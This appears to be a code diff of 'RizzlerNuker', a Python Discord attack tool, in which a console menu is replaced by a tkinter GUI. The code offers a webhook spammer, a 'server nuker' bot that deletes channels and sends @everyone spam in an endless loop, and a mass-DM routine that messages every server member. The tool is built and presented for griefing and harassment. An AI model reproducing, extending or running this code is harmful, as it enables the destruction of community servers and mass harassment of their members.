@@ -1,29 +1,25 @@
-import os
-import requests
+import tkinter as tk
+from tkinter import messagebox
 import discord
 from discord.ext import commands
-import time
-import random
+import requests
 import asyncio
-from os import system
-
-system("title " + "RizzlerNuker")
-
-print("\033[92m░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  \n"
-      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
-      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░    ░▒▓██▓▒░     ░▒▓██▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
-      "\033[92m░▒▓███████▓▒░░▒▓█▓▒░  ░▒▓██▓▒░     ░▒▓██▓▒░  ░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  \n"
-      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓██▓▒░     ░▒▓██▓▒░    ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
-      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n"
-      "\033[92m░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ \n"
-      "By AlmaGangGriefs")
-
-time.sleep(0.5)
+from tkinter import ttk
+import time
+import string
+import random
+import os
 
 number = 0
 
+def dopeniscord():
+    os.system("start https://amg.autizm.us")
+
+def bopenuymeacoffee():
+    os.system("start https://buymeacoffee.com/Polokalap")
+
 def massdms():
-    token = input("Token: ")
+    token = tokenmassdms_entry.get()
 
     intents = discord.Intents.default()
     intents.guilds = True
@@ -41,14 +37,14 @@ def massdms():
                 for member in guild.members:
                     if not member.bot:
                         try:
-                            await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
+                            await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://amg.autizm.us/ The bot's code is open source. @everyone")
                             print(f'Sent DM to: {member.name}')
                         except Exception as e:
                             print(f'Could not send DM to: {member.name}, {e}')
     bot.run(token)
 
 def nuker():
-    token = input("Token: ")
+    token = token_entry.get()
 
     intents = discord.Intents.default()
     intents.guilds = True
@@ -80,15 +76,6 @@ def nuker():
         def delay(seconds):
             return asyncio.sleep(seconds)
 
-        for member in guild.members:
-            if not member.bot:
-                try:
-                    await member.send("Hi! Sorry for harassing you, but the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
-                    print(f'Sent DM to: {member.name}')
-                    await delay(0.1)
-                except Exception as e:
-                    print(f'Could not send DM to: {member.name}, {e}')
-
     async def delete_channels(guild):
         for channel in guild.channels:
             try:
@@ -108,7 +95,7 @@ def nuker():
     async def spam_messages(channel):
         while True:
             try:
-                await channel.send("Nuked by AlmaGangGriefs https://discord.gg/VMkY94U8rv @everyone")
+                await channel.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://amg.autizm.us/ The bot's code is open source. @everyone")
                 await asyncio.sleep(0.1)
             except Exception as e:
                 print(f'Could not send message: {e}')
@@ -117,11 +104,11 @@ def nuker():
     bot.run(token)
 
 def webhookspammer():
-    url = input("Webhook: ")
-    message = input("Message: ")
+    url = url_entry.get()
+    message = message_entry.get()
 
     data = {
-        "content" : "https://discord.gg/VMkY94U8rv @everyone",
+        "content" : "https://amg.autizm.us @everyone",
         "username" : "RizzlerNuker"
     }
 
@@ -143,20 +130,58 @@ def webhookspammer():
         else:
             print(f"Payload delivered successfully, code {result.status_code}.")
 
-print("1: Webhook Spammer")
-print("2: Server Nuker Bot")
-print("3: Massdms")
+root = tk.Tk()
+root.geometry("450x350")
+root.title("RizzlerNuker V1")
+root.resizable(False, False)
 
-choose = input("Funcion: ")
+TAB_CONTROL = ttk.Notebook(root)
 
-while choose != "1" and choose != "2" and choose != "3":
-    choose = input("Funcion: ")
+TAB1 = ttk.Frame(TAB_CONTROL)
+TAB2 = ttk.Frame(TAB_CONTROL)
+TAB3 = ttk.Frame(TAB_CONTROL)
+TAB4 = ttk.Frame(TAB_CONTROL)
+TAB5 = ttk.Frame(TAB_CONTROL)
 
-if choose == "1":
-    webhookspammer()
+TAB_CONTROL.add(TAB1, text='Welcome!')
+TAB_CONTROL.add(TAB2, text='Webhook Spammer')
+TAB_CONTROL.add(TAB3, text='Server Nuker')
+TAB_CONTROL.add(TAB4, text='MassDMS')
+TAB_CONTROL.add(TAB5, text='Support')
 
-elif choose == "2":
-    nuker()
+TAB_CONTROL.pack(expand=1, fill="both")
 
-elif choose == "3":
-    massdms()
+ttk.Label(TAB1, font="Roboto", text="RizzlerNukerV1!").grid(column=1, row=0, padx=10, pady=10)
+ttk.Label(TAB1, text="What is new? V1").grid(column=0, row=1, padx=10, pady=10)
+ttk.Label(TAB1, text="-Gui").grid(column=0, row=2, padx=10, pady=10)
+
+ttk.Label(TAB2, text="Webhook Spammer").grid(column=1, row=0, padx=10, pady=10)
+ttk.Label(TAB2, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
+ttk.Label(TAB2, text="URL:").grid(column=1, row=1, padx=10, pady=10)
+url_entry = ttk.Entry(TAB2)
+url_entry.grid(column=1, row=2, padx=10, pady=10)
+ttk.Label(TAB2, text="Message").grid(column=1, row=3, padx=10, pady=10)
+message_entry = ttk.Entry(TAB2)
+message_entry.grid(column=1, row=4, padx=10, pady=10)
+ttk.Button(TAB2, command=webhookspammer, text="Start").grid(column=1, row=5, padx=10, pady=10)
+
+ttk.Label(TAB3, text="Server Nuker").grid(column=1, row=0, padx=10, pady=10)
+ttk.Label(TAB3, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
+ttk.Label(TAB3, text="TOKEN:").grid(column=1, row=1, padx=10, pady=10)
+token_entry = ttk.Entry(TAB3)
+token_entry.grid(column=1, row=2, padx=10, pady=10)
+ttk.Button(TAB3, command=nuker, text="Start").grid(column=1, row=3, padx=10, pady=10)
+
+ttk.Label(TAB4, text="MASSDMS").grid(column=1, row=0, padx=10, pady=10)
+ttk.Label(TAB4, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
+ttk.Label(TAB4, text="TOKEN:").grid(column=1, row=1, padx=10, pady=10)
+tokenmassdms_entry = ttk.Entry(TAB4)
+tokenmassdms_entry.grid(column=1, row=2, padx=10, pady=10)
+ttk.Button(TAB4, command=massdms, text="Start").grid(column=1, row=3, padx=10, pady=10)
+
+ttk.Label(TAB5, text="Support").grid(column=1, row=0, padx=10, pady=10)
+ttk.Label(TAB5, text="Developed by Polokalap").grid(column=0, row=8, padx=10, pady=10)
+ttk.Button(TAB5, command=dopeniscord, text="Discord").grid(column=1, row=9, padx=3, pady=10)
+ttk.Button(TAB5, command=bopenuymeacoffee, text="BuyMeACoffee").grid(column=1, row=3, padx=10, pady=10)
+
+root.mainloop()
